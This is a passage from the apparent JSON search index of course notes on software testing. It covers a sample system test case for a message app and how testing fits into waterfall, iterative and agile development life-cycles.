messages in the database and display in the UI Alternative Flow Post-conditions nil We can define a system test case as follows Test case ID TC 1 Test case name Create New Message Objective The user creates a new message which will be stored in the Echo app DB Pre-conditions nil Event Sequence Input User navigates to https://localhost:3000/echo/ Output The new message form is displayed Input User enters a new text message and submits Output The list of messages in the system is returned and rendered, which includes the newly submitted message. Post-conditions nil","title":"System Testing"},{"location":"notes/l9_2_integrationtest/#life-cycle-based-testing","text":"In this section, we discuss how to incoporate the testing activities along with the software development life-cycle.","title":"Life-cycle based testing"},{"location":"notes/l9_2_integrationtest/#waterfall-testing","text":"In Walterfall software life-cycle, we could easily incoprate the testing activities as the last few phases. graph A(\"Requirements Specification\") --> B B(\"Analysis\") --> C C(\"Design\") --> D D(\"Coding\") --> E E(\"Unit Testing\") --> F F(\"Integration Test\") --> G(\"System Test\") As highlighted in the earlier lesson, Waterfall testing as part of the waterfall development life-cycle, suffers from the long feedback interval issues.","title":"Waterfall testing"},{"location":"notes/l9_2_integrationtest/#iterative-life-cycle-testing","text":"In Iterative Software Dvelopment Life Cycle, we break and stage different parts/levels of the system components to be developed in different iterations. graph Z(\"Previous Iteration\") --> A A(\"Specification\") --> B B(\"Analysis\") --> C C(\"Design\") --> D D(\"Coding\") --> E E(\"Unit Testing\") --> F F(\"Integration Testing\") --> G G(\"Regression Testing\") --> H H(\"Progression Testing\") --> I(\"Next Iteration\") In terms of testing, we follow a similar structure of waterfall testing for each iteration, except that towards the end, we conduct regression testing and progression testing instead of system test. Regression testing - to re-test the test cases defined and passed in the previous iterations. Progress testing - to pre-test the test cases defined in the upcoming iterations, some of them should fail.","title":"Iterative Life Cycle testing"},{"location":"notes/l9_2_integrationtest/#agile-testing","text":"Recall in Agile development, the development plans are engineered to focus Customer-driven Bottom\u2013up development Flexibility with respect to changing requirements Early delivery of fully functional components Agile Development is often divided into sprints. In each sprints, development team liaise with the project users to identify the deliverables that should be delivered in the particular sprint. In the testing aspect, the testing must be aligned with the user story development for each sprint. graph A(\"Customer Expectation\")-->B B(\"Iteration Plan\")-->C C(\"User Story\")-->D D(\"Design\")-->E E(\"Coding\")-->F F(\"Unit Testing\")-->G G(\"Integration Testing\")-->H H(\"Regression Testing\")-->C","title":"Agile Testing"},{"location":"notes/l9_2_integrationtest/#futher-reading","text":"https://lambtsa.medium.com/rest-api-with-express-router-jest-and-supertest-10832a23016f https://medium.com/geekculture/testing-express-js-with-jest-8c6855945f03","title":"Futher Reading"}]}